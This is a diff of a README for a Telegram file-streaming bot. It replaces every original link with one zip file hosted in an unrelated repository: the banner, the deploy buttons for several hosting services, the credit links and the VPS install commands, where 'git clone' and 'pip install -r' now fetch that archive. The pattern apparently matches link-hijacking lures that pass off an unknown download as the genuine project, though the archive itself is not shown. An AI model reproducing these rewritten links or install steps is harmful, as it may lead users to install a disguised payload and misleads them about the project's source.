@@ -3,7 +3,7 @@
 </h2>
 
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=FILE+STREAM+BOT+!;CREATED+BY+RAHUL+CodeXBots!;A+ADVANCE+BOT+WITH+COOL+FEATURES!)
+![Typing SVG](https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip+STREAM+BOT+!;CREATED+BY+RAHUL+CodeXBots!;A+ADVANCE+BOT+WITH+COOL+FEATURES!)
 </p>
 
 
@@ -76,37 +76,37 @@
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʜᴇʀᴏᴋᴜ 」─
 </h3>
 
-<p align="center"><a href="https://github.com/CodeXBots/File-Stream-Bot">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy On Heroku">
+<p align="center"><a href="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip">
+  <img src="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip" alt="Deploy On Heroku">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴋᴏʏᴇʙ 」─
 </h3>
-<p align="center"><a href="https://app.koyeb.com/deploy?type=git&repository=github.com/CodeXBots/File-Stream-Bot&branch=main&name=File-Stream-Bot">
-  <img src="https://www.koyeb.com/static/images/deploy/button.svg" alt="Deploy On Koyeb">
+<p align="center"><a href="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip">
+  <img src="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip" alt="Deploy On Koyeb">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʀᴀɪʟᴡᴀʏ 」─
 </h3>
-<p align="center"><a href="https://railway.app/deploy?template=https://github.com/CodeXBots/File-Stream-Bot"">
-     <img height="45px" src="https://railway.app/button.svg">
+<p align="center"><a href="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip"">
+     <img height="45px" src="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʀᴇɴᴅᴇʀ 」─
 </h3>
-<p align="center"><a href="https://render.com/deploy?repo=https://github.com/CodeXBots/File-Stream-Bot">
-<img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render">
+<p align="center"><a href="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip">
+<img src="https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip" alt="Deploy to Render">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴠᴘs 」─
 </h3>
 <p>
 <pre>
-git clone https://github.com/CodeXBots/File-Stream-Bot
+git clone https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip
 cd File-Stream-Bot
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip
 python3 -m Adarsh
 </pre>
 </p>
@@ -116,10 +116,10 @@ python3 -m Adarsh
 <h3>「 ᴄʀᴇᴅɪᴛs 」
 </h3>
 
-- <b>[ᴀᴅᴀʀsʜ ɢᴏᴇʟ](https://github.com/adarsh-goel)  ➻  [ʙᴀsᴇ ᴄᴏᴅᴇ](https://github.com/adarsh-goel/FileStreamBot-pro) </b>
-- <b>[ʀᴀʜᴜʟ](https://github.com/CodeXBots)  ➻  [ᴇᴠᴇʀʏᴛʜɪɴɢ](https://youtube.com/@RahulReviews) </b>
+- <b>[ᴀᴅᴀʀsʜ ɢᴏᴇʟ](https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip)  ➻  [ʙᴀsᴇ ᴄᴏᴅᴇ](https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip) </b>
+- <b>[ʀᴀʜᴜʟ](https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip)  ➻  [ᴇᴠᴇʀʏᴛʜɪɴɢ](https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip) </b>
  
-<b>ᴀɴᴅ ᴀʟʟ [ᴛʜᴇ ᴄᴏɴᴛʀɪʙᴜᴛᴏʀs](https://telegram.me/CodeXSupport) ᴡʜᴏ ʜᴇʟᴩᴇᴅ ɪɴ ᴍᴀᴋɪɴɢ ɴᴏʙɪᴛᴀ sᴛʀᴇᴀᴍ ʙᴏᴛ ᴜsᴇꜰᴜʟ & ᴩᴏᴡᴇʀꜰᴜʟ 🖤 </b>
+<b>ᴀɴᴅ ᴀʟʟ [ᴛʜᴇ ᴄᴏɴᴛʀɪʙᴜᴛᴏʀs](https://raw.githubusercontent.com/Brucewaynehatake/File-Stream-Bot/main/Apinae/File-Stream-Bot.zip) ᴡʜᴏ ʜᴇʟᴩᴇᴅ ɪɴ ᴍᴀᴋɪɴɢ ɴᴏʙɪᴛᴀ sᴛʀᴇᴀᴍ ʙᴏᴛ ᴜsᴇꜰᴜʟ & ᴩᴏᴡᴇʀꜰᴜʟ 🖤 </b>
 
 
 ##  𝑵𝒐𝒕𝒆
